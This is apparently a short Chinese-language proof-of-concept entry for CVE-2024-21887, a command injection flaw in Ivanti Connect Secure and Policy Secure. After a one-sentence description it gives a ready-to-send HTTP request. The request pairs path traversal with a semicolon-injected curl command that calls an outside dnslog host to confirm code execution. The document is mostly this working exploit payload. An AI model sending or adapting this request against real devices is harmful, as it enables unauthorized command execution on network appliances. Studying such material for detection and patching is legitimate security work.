## Ivanti_Connect_Secure远程命令注入漏洞(CVE-2024-21887)

Ivаｎti Cоnnесt Sесurе（9.х、22.х）和 Ivаnti Pоliсу Sесurе 的 Wеb 组件中存在一个命令注入漏洞，使得经过身份验证的管理员能够发送特别构建的请求并在设备上执行任意命令 。

## poc
```
GET /api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20z5i19y.dnslog.cn HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate
```

![df97ad07a0d2c2d795cffdd955b1a38b](https://github.com/wy876/POC/assets/139549762/6c54dede-fb0f-4749-99c6-1324cae93042)
